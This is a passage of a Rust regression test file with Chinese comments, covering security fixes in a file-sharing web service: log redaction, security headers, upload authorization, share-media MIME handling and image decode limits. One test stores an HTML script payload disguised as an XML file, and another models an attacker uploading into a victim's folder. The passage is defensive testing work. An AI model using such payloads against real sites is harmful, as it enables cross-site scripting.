    let f = fixture("invite_rollback").await;
    let (admin_id, _) = add_user(&f, "boss").await;
    add_user(&f, "taken_name").await;

    let code = crate::services::invite_code_service::create_codes(&f.pool, admin_id, 1, 1, None, "")
        .await
        .unwrap()
        .remove(0);

    // 用户名冲突
    let req = Request::builder()
        .method("POST")
        .uri("/api/auth/register")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(format!(
            r#"{{"username":"taken_name","password":"secret123","invite_code":"{}"}}"#,
            code.code
        )))
        .unwrap();
    let res = router(&f).oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::CONFLICT, "用户名冲突应返回 409");

    let (used,): (i64,) = sqlx::query_as("SELECT used_count FROM invite_codes WHERE id = ?")
        .bind(code.id)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(
        used, 0,
        "注册失败必须回滚邀请码的占用，客户才能改用户名重试"
    );

    f.cleanup().await;
}

/// 邀请码接口必须受管理员权限保护——普通用户不得读写。
#[tokio::test]
async fn invite_code_admin_endpoints_require_admin() {
    let f = fixture("invite_authz").await;
    let (_, user_token) = add_user(&f, "normal_user").await;

    for (method, uri) in [
        ("GET", "/api/admin/invite-codes"),
        ("POST", "/api/admin/invite-codes"),
    ] {
        let req = authed_json(method, uri, &user_token, r#"{"count":1}"#);
        let res = router(&f).oneshot(req).await.unwrap();
        assert!(
            res.status() == StatusCode::UNAUTHORIZED || res.status() == StatusCode::FORBIDDEN,
            "{method} {uri} 对普通用户应被拒，实际 {}",
            res.status()
        );
    }

    f.cleanup().await;
}
/// 请求日志不得包含 query string 里的凭据。
///
/// 缩略图/预览图走查询串旁路（`<img src>` 带不了 Authorization 头，
/// 见 frontend/src/api.js），而 `TraceLayer::new_for_http()` 的默认实现会把
/// 完整 URI（含 query）写进 span。后果是**每加载一次缩略图就把一枚凭据明文
/// 写进日志**，compose 还配了 10m×3 轮转，等于把凭据复制三份留在磁盘上。
///
/// 底层凭据已从 JWT 换成窄口径的 media ticket（见 utils::crypto），
/// 但「日志不该记 query」这条与凭据种类无关，仍然必须独立成立。
///
/// 断言打在真实渲染出的日志行上，而不是 span 内部结构——这样测的是
/// 「运维最终会在日志里看到什么」，与内部实现解耦。
///
/// ## 为什么用「进程级 subscriber + 每线程缓冲」而不是 `with_default`
///
/// 最初这里用的是 `tracing::subscriber::with_default(...)` 装一个线程本地
/// subscriber。它**在并行跑整个测试套件时不可靠**：约 1/4 的运行里缓冲是空的
/// （请求本身正常完成、返回 404，但一条日志都没落进来），断言随机失败；
/// 单独跑则 100% 通过。加 `FmtSpan::NEW` 让 span 一创建就输出也没用 ——
/// 说明问题不在「span 内部有没有事件」，而在线程本地 dispatch 根本没生效。
///
/// 现在改成：整个测试二进制只装一次**全局** subscriber（全局默认不依赖线程
/// 状态，不存在这个竞态），写入端再按线程分流到各自的缓冲。这样每个用例读到的
/// 仍然只是**自己线程**产出的日志，与 `with_default` 的语义一致，但不再有竞态。
#[test]
fn request_log_never_contains_credential_from_query_string() {
    // 每个线程一个日志缓冲：全局 subscriber 会把所有用例的日志都送进来，
    // 按线程分流之后，本用例只读自己那一条流。
    thread_local! {
        static LOG_BUF: std::cell::RefCell<Vec<u8>> = const { std::cell::RefCell::new(Vec::new()) };
    }

    struct TlWriter;
    impl std::io::Write for TlWriter {
        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
            LOG_BUF.with(|b| b.borrow_mut().extend_from_slice(buf));
            Ok(buf.len())
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }

    #[derive(Clone, Copy)]
    struct TlMakeWriter;
    impl<'a> tracing_subscriber::fmt::MakeWriter<'a> for TlMakeWriter {
        type Writer = TlWriter;
        fn make_writer(&'a self) -> Self::Writer {
            TlWriter
        }
    }

    static INSTALL: std::sync::Once = std::sync::Once::new();
    INSTALL.call_once(|| {
        let subscriber = tracing_subscriber::registry()
            .with(
                tracing_subscriber::fmt::layer()
                    .with_ansi(false)
                    .with_writer(TlMakeWriter)
                    // span 一创建就输出一行，断言不依赖 span 内部是否有事件。
                    .with_span_events(tracing_subscriber::fmt::format::FmtSpan::NEW),
            )
            // 请求日志是 DEBUG 级，测试里显式打开——
            // 这正是「有人把 RUST_LOG 调成 debug」时的情形。
            .with(tracing_subscriber::filter::LevelFilter::DEBUG);
        // 装不上（例如别处已装过）就让断言自然失败，不静默跳过。
        let _ = tracing::subscriber::set_global_default(subscriber);
    });

    // 走**真实的路由器**，而不是直接调 `default_make_span`。
    // 直接调函数的话，把 build_router 里的 make_span_with 摘掉测试照样绿
    // ——它测的只是那个函数自己，测不到「实际生效的 layer 用的是哪个」。
    // 只有真打一次请求，才能锁住「运维最终在日志里看到什么」。
    //
    // 这是一个 #[test] 而不是 #[tokio::test]：我们要控制请求跑在哪个线程上
    // （读的是该线程的缓冲），所以自己建一个 current_thread 运行时。
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .expect("构建单线程运行时失败");

    let f = rt.block_on(fixture("log_sanitize"));
    let (_uid, token) = rt.block_on(add_user(&f, "someone"));

    let secret = format!("{}TOPSECRETPART", &token[..40]);
    let uri = format!("/api/files/42/media?ticket={}&v=1", secret);
    let req = Request::builder()
        .method("GET")
        .uri(&uri)
        .header(header::AUTHORIZATION, format!("Bearer {}", token))
        .body(Body::empty())
        .expect("构造请求失败");

    LOG_BUF.with(|b| b.borrow_mut().clear());
    rt.block_on(async {
        let _ = router(&f).oneshot(req).await;
    });
    let log = LOG_BUF.with(|b| String::from_utf8_lossy(&b.borrow()).into_owned());

    assert!(
        !log.contains("TOPSECRETPART"),
        "日志里出现了令牌明文：{log}"
    );
    assert!(
        log.contains("/api/files/42/media"),
        "路径应保留在日志里，否则失去排障价值；实际：{log}"
    );
    // query 整体都不该出现，不只是凭据那一段
    assert!(!log.contains("ticket="), "日志里出现了凭据 query：{log}");
    assert!(!log.contains("v=1"), "日志里出现了 query 串：{log}");
}

// ---------------------------------------------------------------------------
// SPA 深链回退
// ---------------------------------------------------------------------------
//
// 原先只给 `/share/*` 挂了回退，于是 `/admin`、`/search`、`/trash` 直接访问
// 或刷新会 404。单页内导航看不出来，但「把 /admin 收藏了再点开」是很自然的
// 动作 —— 局域网里容易忽略，公网上就是一句「你给的链接打不开」。

#[tokio::test]
async fn spa_deep_links_serve_index_html() {
    let f = fixture("spa_deeplink").await;

    for path in [
        "/",
        "/admin",
        "/search",
        "/trash",
        "/shares",
        // 更深的路径同样要回退：前端路由将来加子路径时不必再改后端
        "/admin/users/3",
        "/share/not-a-real-share-id",
    ] {
        let res = router(&f)
            .oneshot(Request::builder().uri(path).body(Body::empty()).unwrap())
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK, "{path} 应回退到 index.html");

        let ct = res
            .headers()
            .get(header::CONTENT_TYPE)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();
        assert!(
            ct.starts_with("text/html"),
            "{path} 的 Content-Type 应为 text/html，实际 {ct}"
        );

        let body = body_text(res).await;
        assert!(
            body.contains("SPA-MARKER"),
            "{path} 应返回 index.html 的内容，实际 {body}"
        );
    }

    f.cleanup().await;
}

/// 静态资源必须优先于回退命中，否则 JS / CSS / favicon 全都会被换成 HTML。
#[tokio::test]
async fn static_assets_win_over_the_spa_fallback() {
    let f = fixture("spa_assets").await;

    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri("/assets/app.js")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let body = body_text(res).await;
    assert!(
        body.contains("console.log('asset')"),
        "静态资源被回退盖掉了：{body}"
    );
    assert!(!body.contains("SPA-MARKER"), "静态资源不该拿到 index.html");

    f.cleanup().await;
}

/// 未匹配的 `/api/` 路径继续返回 JSON 404。
///
/// 若也回退成 index.html，前端把端点名拼错时会拿到一坨 HTML，
/// axios 解析失败后报出的错误与真实原因毫无关系，排查成本陡增。
#[tokio::test]
async fn unknown_api_paths_still_return_json_404() {
    let f = fixture("spa_api404").await;

    for path in ["/api/nope", "/api/files/1/nonexistent"] {
        let res = router(&f)
            .oneshot(Request::builder().uri(path).body(Body::empty()).unwrap())
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::NOT_FOUND, "{path} 应为 404");
        let body = json_body(res).await;
        assert_eq!(
            body["success"], false,
            "{path} 应返回统一信封的 JSON，实际 {body}"
        );
    }

    f.cleanup().await;
}

/// 全站安全响应头。逐条都是「没加就等于没防」的那类。
#[tokio::test]
async fn security_headers_are_present_on_every_response() {
    let f = fixture("sec_headers").await;
    let (uid, token) = add_user(&f, "hdr").await;
    let (file_id, _) = add_file(&f, uid, "a.jpg", b"x").await;

    // 覆盖三类响应：API、静态资源 / SPA 回退、媒体流
    let cases: Vec<(String, Option<String>)> = vec![
        ("/api/health".to_string(), None),
        ("/admin".to_string(), None),
        (
            format!("/api/files/{}/download", file_id),
            Some(format!("Bearer {}", token)),
        ),
    ];

    for (uri, auth) in cases {
        let mut req = Request::builder().uri(&uri);
        if let Some(a) = &auth {
            req = req.header(header::AUTHORIZATION, a);
        }
        let res = router(&f)
            .oneshot(req.body(Body::empty()).unwrap())
            .await
            .unwrap();

        for (name, want) in [
            (header::X_FRAME_OPTIONS, "SAMEORIGIN"),
            (header::X_CONTENT_TYPE_OPTIONS, "nosniff"),
            (header::REFERRER_POLICY, "no-referrer"),
        ] {
            let got = res
                .headers()
                .get(&name)
                .and_then(|v| v.to_str().ok())
                .unwrap_or("");
            assert_eq!(got, want, "{uri} 缺少 {name:?} 或其值不符");
        }
    }

    f.cleanup().await;
}

/// 一张 1×1 的合法 PNG，用于验证「白名单内类型仍可内联预览」。
///
/// 早期版本是手抄的字节常量，结果 color type 声明为 RGB(2) 而 IDAT 只
/// 解出 2 字节像素，解码器读到 IEND 时数据不足 → UnexpectedEof。
/// 改为调用 `make_png` 现生成，避免再手抄出错。
fn png_1px() -> Vec<u8> {
    make_png(1, 1)
}


/// 造一张指定尺寸的**空白** PNG。
///
/// 用 zlib 存储块（未压缩）而不是真压缩：解码器在读像素前就会检查
/// `max_image_width/height`，所以我们只需要一个**尺寸声明**正确、
/// 内容合法的 PNG。存储块让 IDAT 随像素数线性增长，20001 宽的图约 80KB，
/// 构造时间可以忽略。
fn make_png(width: u32, height: u32) -> Vec<u8> {
    fn crc32(data: &[u8]) -> u32 {
        let mut table = [0u32; 256];
        for (i, entry) in table.iter_mut().enumerate() {
            let mut c = i as u32;
            for _ in 0..8 {
                c = if c & 1 != 0 { 0xEDB88320 ^ (c >> 1) } else { c >> 1 };
            }
            *entry = c;
        }
        let mut crc = 0xFFFF_FFFFu32;
        for &b in data {
            crc = table[((crc ^ b as u32) & 0xFF) as usize] ^ (crc >> 8);
        }
        crc ^ 0xFFFF_FFFF
    }

    fn adler32(data: &[u8]) -> u32 {
        let (mut a, mut b) = (1u32, 0u32);
        for &x in data {
            a = (a + x as u32) % 65521;
            b = (b + a) % 65521;
        }
        (b << 16) | a
    }

    /// 组一个 PNG chunk：长度(4) + 类型(4) + 数据 + CRC(4)
    fn chunk(kind: &[u8; 4], data: &[u8]) -> Vec<u8> {
        let mut out = Vec::with_capacity(data.len() + 12);
        out.extend_from_slice(&(data.len() as u32).to_be_bytes());
        let mut body = Vec::with_capacity(data.len() + 4);
        body.extend_from_slice(kind);
        body.extend_from_slice(data);
        out.extend_from_slice(&body);
        out.extend_from_slice(&crc32(&body).to_be_bytes());
        out
    }

    // 扫描线原始数据：每行是 1 个 filter byte + width 个灰度字节
    let row = width as usize + 1;
    let raw = vec![0u8; row * height as usize];

    // zlib 存储块（BTYPE=00）：2 字节头 + 块头 + 数据 + adler32
    let mut idat = Vec::with_capacity(raw.len() + 5);
    idat.push(0x78); // CMF: deflate, 32K window
    idat.push(0x01); // FLG: no dict, fastest
    idat.push(0x01); // BFINAL=1, BTYPE=00
    idat.extend_from_slice(&(raw.len() as u16).to_le_bytes());
    idat.extend_from_slice(&(!(raw.len() as u16)).to_le_bytes());
    idat.extend_from_slice(&raw);
    idat.extend_from_slice(&adler32(&raw).to_be_bytes());

    let mut ihdr = Vec::with_capacity(13);
    ihdr.extend_from_slice(&width.to_be_bytes());
    ihdr.extend_from_slice(&height.to_be_bytes());
    ihdr.extend_from_slice(&[8, 0, 0, 0, 0]); // 8bit greyscale

    let mut png = Vec::new();
    png.extend_from_slice(&[0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
    png.extend_from_slice(&chunk(b"IHDR", &ihdr));
    png.extend_from_slice(&chunk(b"IDAT", &idat));
    png.extend_from_slice(&chunk(b"IEND", &[]));
    png
}

/// 直接插一条分享记录（不走创建接口），返回分享 id。
///
/// 公开分享的回归测试需要**构造特定状态**（比如非白名单后缀、无密码），
/// 走 `POST /api/shares` 反而会挡住某些组合。
async fn insert_share(
    f: &Fixture,
    owner_id: i64,
    file_id: Option<i64>,
    password: &str,
    max_downloads: Option<i64>,
) -> String {
    let hash = if password.is_empty() {
        String::new()
    } else {
        crypto::hash_password(password).expect("bcrypt 失败")
    };
    let id = uuid::Uuid::new_v4().to_string();
    sqlx::query(
        "INSERT INTO file_shares (id, owner_id, password_hash, max_downloads)
         VALUES (?, ?, ?, ?)",
    )
    .bind(&id)
    .bind(owner_id)
    .bind(&hash)
    .bind(max_downloads)
    .execute(&f.pool)
    .await
    .expect("插入分享失败");
    if let Some(fid) = file_id {
        sqlx::query(
            "INSERT INTO share_items (share_id, item_type, item_id) VALUES (?, 'file', ?)",
        )
        .bind(&id)
        .bind(fid)
        .execute(&f.pool)
        .await
        .expect("插入批次条目失败");
    }
    id
}

// ===========================================================================
// 回归测试：公网暴露前的三项 P0 修复
// ---------------------------------------------------------------------------
// 每条都对应一个**实测坐实过**的缺陷，断言写成行为式
// （「B 不能通过 A 这条路拿到 X」）而非快照式，重构不会误报。
// ===========================================================================

// ---- 修复 1：管理员代传文件时 folder 归属校验绑错了 id ----

/// 管理员为其他用户上传、且指定了**该用户的**文件夹时，必须成功。
///
/// 修复前 `upload_files` 校验 folder 归属时绑定的是 `auth.user_id`（管理员
/// 自己），而 `owner_id` 在前面的分支里已解析为目标用户。两者不一致，
/// 于是管理员代传功能 100% 失败（实测稳定返回 400「目标文件夹不存在」），
/// 而「不传 folder_id」和「传自己的文件夹」都正常——所以很容易被误判成
/// 「管理员功能有 bug 但不影响其他路径」。
#[tokio::test]
async fn admin_can_upload_into_another_users_folder() {
    let f = fixture("admin_upload_folder").await;
    let (admin_id, admin_token) = add_user(&f, "boss").await;
    sqlx::query("UPDATE users SET role = 'admin' WHERE id = ?")
        .bind(admin_id)
        .execute(&f.pool)
        .await
        .unwrap();

    // 目标用户 + 属于他的文件夹
    let (client_id, _) = add_user(&f, "client").await;
    let client_folder = add_folder(&f, client_id, "客户相片", None).await;

    // multipart 严格按前端 api.js 的字段顺序：folder_id -> user_id -> file
    let mut body = Vec::new();
    body.extend_from_slice(b"------T\r\n");
    body.extend_from_slice(b"Content-Disposition: form-data; name=\"folder_id\"\r\n\r\n");
    body.extend_from_slice(client_folder.to_string().as_bytes());
    body.extend_from_slice(b"\r\n------T\r\n");
    body.extend_from_slice(b"Content-Disposition: form-data; name=\"user_id\"\r\n\r\n");
    body.extend_from_slice(client_id.to_string().as_bytes());
    body.extend_from_slice(b"\r\n------T\r\n");
    body.extend_from_slice(
        b"Content-Disposition: form-data; name=\"file\"; filename=\"p.jpg\"\r\n\r\n",
    );
    body.extend_from_slice(&[0u8; 32]);
    body.extend_from_slice(b"\r\n------T--\r\n");

    let req = Request::builder()
        .method("POST")
        .uri("/api/files/upload")
        .header(header::AUTHORIZATION, format!("Bearer {}", admin_token))
        .header(
            header::CONTENT_TYPE,
            "multipart/form-data; boundary=----T",
        )
        .body(Body::from(body))
        .unwrap();

    let res = router(&f).oneshot(req).await.unwrap();
    let status = res.status();
    let body = json_body(res).await;

    assert_eq!(
        status,
        StatusCode::OK,
        "管理员代传到他人文件夹应成功，实际 {status}：{body}"
    );
    assert_eq!(body["success"], serde_json::json!(true));

    // 文件必须真的落在**目标用户**的名下，而不是管理员名下
    let (owner, folder): (i64, Option<i64>) =
        sqlx::query_as("SELECT owner_id, folder_id FROM files WHERE original_name = 'p.jpg'")
            .fetch_one(&f.pool)
            .await
            .expect("文件应已入库");
    assert_eq!(owner, client_id, "文件应归属目标用户");
    assert_eq!(folder, Some(client_folder), "文件应落在指定文件夹");

    f.cleanup().await;
}

/// 边界：非管理员不得借 `user_id` 把他人的文件夹当自己的用。
///
/// 修复 1 把绑定从 `auth.user_id` 换成了 `owner_id`，必须确认这没有放宽权限：
/// 普通用户的 `owner_id` 恒等于 `auth.user_id`（explicit_user 分支先 403），
/// 所以这条路径仍应拒绝。
#[tokio::test]
async fn normal_user_cannot_upload_into_another_users_folder() {
    let f = fixture("upload_cross_user").await;
    let (_attacker_id, attacker_token) = add_user(&f, "attacker").await;
    let (victim_id, _) = add_user(&f, "victim").await;
    let victim_folder = add_folder(&f, victim_id, "私密", None).await;

    // 攻击者声称 user_id=自己（绕过管理员检查）但指定受害者的文件夹
    let mut body = Vec::new();
    body.extend_from_slice(b"------T\r\n");
    body.extend_from_slice(b"Content-Disposition: form-data; name=\"folder_id\"\r\n\r\n");
    body.extend_from_slice(victim_folder.to_string().as_bytes());
    body.extend_from_slice(b"\r\n------T\r\n");
    body.extend_from_slice(b"Content-Disposition: form-data; name=\"file\"; filename=\"x.jpg\"\r\n\r\n");
    body.extend_from_slice(&[0u8; 16]);
    body.extend_from_slice(b"\r\n------T--\r\n");

    let req = Request::builder()
        .method("POST")
        .uri("/api/files/upload")
        .header(header::AUTHORIZATION, format!("Bearer {}", attacker_token))
        .header(header::CONTENT_TYPE, "multipart/form-data; boundary=----T")
        .body(Body::from(body))
        .unwrap();

    let res = router(&f).oneshot(req).await.unwrap();
    assert!(
        !res.status().is_success(),
        "普通用户不得写入他人文件夹，实际 {}",
        res.status()
    );

    let (n,): (i64,) = sqlx::query_as("SELECT COUNT(*) FROM files")
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(n, 0, "被拒的上传不得留下文件记录");

    f.cleanup().await;
}

// ---- 修复 2：公开分享媒体接口绕过预览白名单 ----

/// 公开分享的 media 接口必须与认证后的 serve_media 用同一套策略。
///
/// 修复前 `public_share_media` 用 `serve_path` 推导 MIME 且不设
/// `Content-Disposition`（等价于内联渲染）。而 `serve_path` 在回退分支里是
/// `stored_path`，后缀来自用户可控的 `original_name`。于是「上传内容为
/// HTML 的 jpg → 改名为 .xml → 公开分享」会得到 `Content-Type: text/xml`
/// 且内联渲染——`nosniff` 拦不住（text/xml 是精确 MIME），而这是**无鉴权
/// 接口**，任何拿到分享链接的人都能触发。
#[tokio::test]
async fn public_share_media_honours_the_inline_whitelist() {
    let f = fixture("public_media_policy").await;
    let (owner_id, _) = add_user(&f, "owner").await;

    // 构造一个「后缀不在内联白名单内」的文件记录
    let (_id, _path) =
        add_file(&f, owner_id, "payload.xml", b"<html><script>alert(1)</script></html>").await;
    let share_id = insert_share(&f, owner_id, Some(_id), "", None).await;

    let res = router(&f)
        .oneshot(
            Request::builder()
                .method("GET")
                .uri(format!("/api/public/shares/{}/media?file_id={}", share_id, _id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    // 白名单外的类型要么被拒（无预览图时），要么必须降级为 attachment
    if res.status() == StatusCode::OK {
        let cd = header_of(&res, "content-disposition");
        let ct = header_of(&res, "content-type");
        assert!(
            cd.starts_with("attachment"),
            "非白名单类型必须降级为下载，实际 Content-Disposition={cd:?}"
        );
        assert_eq!(
            ct, "application/octet-stream",
            "非白名单类型不得回显真实 MIME"
        );
        assert!(
            header_of(&res, "content-security-policy").contains("sandbox"),
            "降级响应应附带 CSP 沙箱"
        );
    }

    f.cleanup().await;
}

/// 白名单内的图片类型必须仍然能内联预览——修安全最容易把功能修坏。
#[tokio::test]
async fn public_share_media_still_inlines_real_images() {
    let f = fixture("public_media_ok").await;
    let (owner_id, _) = add_user(&f, "owner").await;
    let (_id, _path) = add_file(&f, owner_id, "photo.png", &png_1px()).await;
    let share_id = insert_share(&f, owner_id, Some(_id), "", None).await;

    let res = router(&f)
        .oneshot(
            Request::builder()
                .method("GET")
                .uri(format!("/api/public/shares/{}/media?file_id={}", share_id, _id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK, "真实图片应能预览");
    assert_eq!(header_of(&res, "content-type"), "image/png");
    assert!(
        header_of(&res, "content-disposition").starts_with("inline"),
        "白名单内类型应保持 inline，实际 {:?}",
        header_of(&res, "content-disposition")
    );
    assert_eq!(header_of(&res, "x-content-type-options"), "nosniff");

    f.cleanup().await;
}

/// 公开分享的下载头必须带 RFC 5987 的 `filename*`。
///
/// 修复前 `public_share_download` 用裸 `format!` 拼 `filename="{原名}"`，
/// 中文文件名在各浏览器下会乱码，而认证后的下载路径走统一的
/// `content_disposition()`。两条路径现在必须一致。
#[tokio::test]
async fn public_share_download_encodes_unicode_filenames() {
    let f = fixture("public_dl_name").await;
    let (owner_id, _) = add_user(&f, "owner").await;
    let (_id, _path) = add_file(&f, owner_id, "婚礼精修_001.png", &png_1px()).await;
    let share_id = insert_share(&f, owner_id, Some(_id), "", None).await;

    let res = router(&f)
        .oneshot(
            Request::builder()
                .method("GET")
                .uri(format!("/api/public/shares/{}/download?file_id={}", share_id, _id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let cd = header_of(&res, "content-disposition");
    assert!(
        cd.contains("filename*=UTF-8''"),
        "下载头应含 RFC 5987 编码，实际 {cd:?}"
    );
    assert!(
        cd.contains("%E5%A9%9A"),
        "中文名应做 percent-encoding，实际 {cd:?}"
    );

    f.cleanup().await;
}

// ---- 修复 3：图片解码无内存上限 ----

/// 超过解码尺寸上限的图必须被拒，而不是整张读进内存。
///
/// `image` 的 `ImageReader` 按格式分派解码器时**只有 PNG 会拿到 Limits**
/// （`io/image_reader_type.rs:183` 只对 `ImageFormat::Png` 传
/// `limits_for_png`），JPEG/GIF/WebP/TIFF/AVIF 一律走 `Decoder::new`，
/// 也就是 `Limits::default()`——而它的 `max_image_width/height` 都是
/// `None`，等于**没有上限**。一张几 MB 的高压缩比 JPEG 就能撑出几个 GB
/// 的解码结果，直接 OOM 掉整个进程。
///
/// 这里直接测限流函数本身：超过 MAX_DECODE_PIXELS_W/H 的图必须返回 Err。
#[test]
fn oversized_images_are_rejected_before_full_decode() {
    use crate::services::preview_service::{open_limited, MAX_DECODE_PIXELS_H, MAX_DECODE_PIXELS_W};

    // 构造一张尺寸超限的最小 PNG：解码器在读像素前就会被 set_limits 拦下。
    // 20001 x 1 的 PNG 头 + 空白 IDAT，压缩后只有几百字节。
    let w = MAX_DECODE_PIXELS_W + 1;
    let h = 1u32;
    let png = make_png(w, h);
    let dir = std::env::temp_dir().join(format!("pan_limits_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("huge.png");
    std::fs::write(&path, &png).unwrap();

    let res = open_limited(&path);

    let _ = std::fs::remove_dir_all(&dir);

    assert!(
        res.is_err(),
        "{}x{} 的图应被解码上限拒绝（上限 {}x{}）",
        w,
        h,
        MAX_DECODE_PIXELS_W,
        MAX_DECODE_PIXELS_H
    );
}

/// 正常尺寸的图必须照常解码——限流不能把功能修坏。
#[test]
fn normal_images_still_decode_under_limits() {
    use crate::services::preview_service::open_limited;

    let dir = std::env::temp_dir().join(format!("pan_limits_ok_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("ok.png");
    std::fs::write(&path, make_png(64, 32)).unwrap();

    let res = open_limited(&path);
    let _ = std::fs::remove_dir_all(&dir);

    let img = res.expect("正常尺寸的图不应被拒");
    assert_eq!(image::GenericImageView::dimensions(&img), (64, 32));
}

/// 极小的高度也要拦得住——只限宽度的实现会漏掉「高瘦图」。
#[test]
fn oversized_height_is_also_rejected() {
    use crate::services::preview_service::{open_limited, MAX_DECODE_PIXELS_H};

    let png = make_png(1, MAX_DECODE_PIXELS_H + 1);
    let dir = std::env::temp_dir().join(format!("pan_limits_h_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("tall.png");
    std::fs::write(&path, &png).unwrap();

    let res = open_limited(&path);
    let _ = std::fs::remove_dir_all(&dir);

    assert!(res.is_err(), "超高的图同样应被拒");
}

/// 极小尺寸（1x1）必须能过——限流的下界不能太严。
#[test]
fn tiny_images_are_allowed() {
    use crate::services::preview_service::open_limited;

    let dir = std::env::temp_dir().join(format!("pan_limits_tiny_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("tiny.png");
    std::fs::write(&path, png_1px()).unwrap();

    let res = open_limited(&path);
    let _ = std::fs::remove_dir_all(&dir);

    assert!(res.is_ok(), "1x1 的图不应被拒，实际错误：{:?}", res.err());
}

// ---------------------------------------------------------------------------
// 有密码分享：验码之后必须能看到预览
// ---------------------------------------------------------------------------
//
// 回归的是这样一条链：`share_to_info` 曾经写成
// `if !password_hash.is_empty() { None }` —— 媒体 URL 的下发只取决于
// 「这个分享有没有密码」，与请求带没带 ticket 完全无关。于是受密码保护的分享
// 无论访客输没输对密码，`preview_url` 永远是 null，前端 PublicShare.vue 的
// 媒体区永远走 fallback 分支显示「该文件类型暂不支持在线预览」。
//
// 而「有密码的交付链接」正是本项目的核心用法，`verify()` 之后重新 load()
// 这条前端流程本就是为它设计的 —— 只是后端从没配合过。

// 注：这些用例**不能**调 `login_throttle::reset_for_test()`。那个函数清的是
// 进程级全局表，而 `login_throttle` 自己的测试正并行观察着同一张表 —— 一清就会
// 让它们随机失败（实测：`backoff_counts_down_as_time_passes` 会偶发挂掉）。
// 这里本来也不需要：每个用例都新建一个 uuid4 分享码，`/verify` 的限流按分享码
// 分桶，天然互不干扰；每个用例最多失败一次，也够不到 5 次的阈值。

#[tokio::test]
async fn password_share_shows_media_only_after_verifying() {
    let f = fixture("share_pwd_media").await;
    let (uid, token) = add_user(&f, "shooter").await;
    let (file_id, _) = add_file(&f, uid, "wedding.jpg", b"pretend-jpeg").await;

    // 造出真实的预览/缩略图文件，并写回记录 —— 让「有预览」这个前提成立
    let preview_dir = f
        .config
        .upload_dir
        .join(format!("user_{}", uid))
        .join("previews");
    std::fs::create_dir_all(&preview_dir).unwrap();
    std::fs::write(preview_dir.join("p.jpg"), b"preview-bytes").unwrap();
    std::fs::write(preview_dir.join("t.jpg"), b"thumb-bytes").unwrap();
    sqlx::query("UPDATE files SET preview_path = ?, thumb_path = ? WHERE id = ?")
        .bind(format!("user_{}/previews/p.jpg", uid))
        .bind(format!("user_{}/previews/t.jpg", uid))
        .bind(file_id)
        .execute(&f.pool)
        .await
        .unwrap();

    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &format!(
                r#"{{"items":[{{"type":"file","id":{}}}],"expires_hours":null,"password":"letmein","max_downloads":null,"custom_code":null}}"#,
                file_id
            ),
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let share_id = json_body(res).await["data"]["id"]
        .as_str()
        .unwrap()
        .to_string();

    // ① 还没验码：媒体 URL 一律不下发（密码门不能只靠前端自觉）
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}", share_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let body = json_body(res).await;
    assert_eq!(body["data"]["has_password"], true);
    assert!(
        body["data"]["preview_url"].is_null() && body["data"]["thumb_url"].is_null(),
        "未验码就下发媒体 URL 等于密码门形同虚设：{body}"
    );

    // ② 验码拿到 ticket
    let res = router(&f)
        .oneshot(
            Request::builder()
                .method("POST")
                .uri(format!("/api/public/shares/{}/verify", share_id))
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(r#"{"password":"letmein"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK, "口令正确应签发 ticket");
    let ticket = json_body(res).await["data"]["ticket"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(!ticket.is_empty());

    // ③ **带票重新拉详情 —— 这一步在修复前恒为 null。**
    //    前端 PublicShare.vue 的 verify() 正是这么做的。
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!(
                    "/api/public/shares/{}?ticket={}",
                    share_id, ticket
                ))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let body = json_body(res).await;
    // 批次模型下媒体地址挂在**每个条目**上，不再是分享的顶层字段。
    let item = &body["data"]["items"][0];
    assert_eq!(item["item_type"], "file");
    let preview_url = item["preview_url"].as_str().unwrap_or("");
    assert!(
        preview_url.contains("/media"),
        "验码后必须下发预览地址，否则客户永远看不到图：{body}"
    );
    assert!(
        !item["thumb_url"].is_null(),
        "验码后缩略图地址同样应下发：{body}"
    );

    // ④ URL 要真的能用（否则「下发了」只是好看）
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!(
                    "/api/public/shares/{}/media?file_id={}&thumb=1&ticket={}",
                    share_id, file_id, ticket
                ))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    assert_eq!(body_text(res).await, "thumb-bytes");

    // ⑤ 没有票时媒体接口仍然拒绝
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}/media?file_id={}&thumb=1", share_id, file_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
